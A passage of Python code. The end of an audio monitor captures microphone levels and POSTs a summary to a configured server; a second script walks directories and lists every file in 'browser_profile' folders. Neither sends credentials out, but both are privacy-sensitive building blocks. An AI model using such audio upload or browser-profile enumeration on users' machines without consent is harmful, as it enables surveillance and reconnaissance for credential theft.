                CONFIG["server_endpoint"],
                data=data,
                headers={
                    'Content-Type': 'application/json',
                    'Content-Length': len(data)
                },
                method='POST'
            )

            with urlopen(request, timeout=CONFIG["timeout"]) as response:
                response_data = response.read().decode('utf-8')
                logger.info(f"Server response ({response.status}): {response_data}")
                return True

        except HTTPError as e:
            logger.error(f"HTTP error {e.code}: {e.reason}")
        except URLError as e:
            logger.error(f"URL error: {e.reason}")
        except socket.timeout:
            logger.error("Connection timeout")
        except Exception as e:
            logger.error(f"Unexpected error: {e}")

        if attempt < CONFIG["retry_attempts"]:
            logger.info(f"Retrying in {CONFIG['retry_interval']} seconds...")
            time.sleep(CONFIG["retry_interval"])

    logger.warning("All retry attempts exhausted. Server unreachable.")

    # Log failure locally
    failure_log = {
        "timestamp": datetime.now().isoformat(),
        "event": "server_send_failed",
        "attempts": CONFIG["retry_attempts"],
        "endpoint": CONFIG["server_endpoint"],
        "summary": summary
    }

    try:
        with open("server_failures.log", "a") as f:
            f.write(json.dumps(failure_log) + "\n")
        logger.info("Failure logged to server_failures.log")
    except Exception as e:
        logger.error(f"Failed to write failure log: {e}")

    return False


def main():
    """Main execution function."""
    logger.info("=" * 60)
    logger.info("Audio Device Monitor Started")
    logger.info(f"Configuration: {json.dumps(CONFIG, indent=2)}")
    logger.info("=" * 60)

    try:
        # Capture audio data
        audio_data = capture_audio_data()

        # Create summary
        summary = create_summary(audio_data)

        # Write to local file
        write_local_file(summary)

        # Print to console
        print(f"\nAudio Device: {summary['device_status']}")
        if summary['device_status'] == "available":
            print(f"RMS Amplitude: {summary.get('rms_amplitude', 'N/A')}")
            print(f"Level (normalized): {summary.get('level_normalized', 'N/A')}")

        # Attempt to send to server
        send_to_server(summary)

        logger.info("Audio monitoring completed successfully")
        return 0

    except KeyboardInterrupt:
        logger.info("Program interrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Unexpected error in main: {e}", exc_info=True)
        return 1


if __name__ == "__main__":
    sys.exit(main())

#!/usr/bin/env python3
"""Scan directory for browser_profile subdirectories and list their contents."""

import os
import sys
from pathlib import Path


def scan_for_browser_profiles(root_dir):
    """Scan root_dir for browser_profile subdirectories and list files within."""
    root_path = Path(root_dir).resolve()

    if not root_path.exists():
        print(f"Error: Directory '{root_dir}' does not exist", file=sys.stderr)
        return

    if not root_path.is_dir():
        print(f"Error: '{root_dir}' is not a directory", file=sys.stderr)
        return

    found_profiles = []

    for dirpath, dirnames, filenames in os.walk(root_path):
        if 'browser_profile' in dirnames:
            profile_path = Path(dirpath) / 'browser_profile'
            found_profiles.append(profile_path)

    if not found_profiles:
        print(f"No 'browser_profile' directories found in {root_dir}")
        return

    for profile_path in found_profiles:
        print(f"\n{profile_path}:")
        print("-" * 80)

        try:
            for item in sorted(profile_path.rglob('*')):
                if item.is_file():
                    relative_path = item.relative_to(profile_path)
                    print(f"  {relative_path}")
        except PermissionError:
            print(f"  [Permission denied]", file=sys.stderr)


def main():
    if len(sys.argv) < 2:
        print("Usage: python scanner.py <directory>")
        sys.exit(1)

    target_dir = sys.argv[1]
    scan_for_browser_profiles(target_dir)


if __name__ == "__main__":
    main()

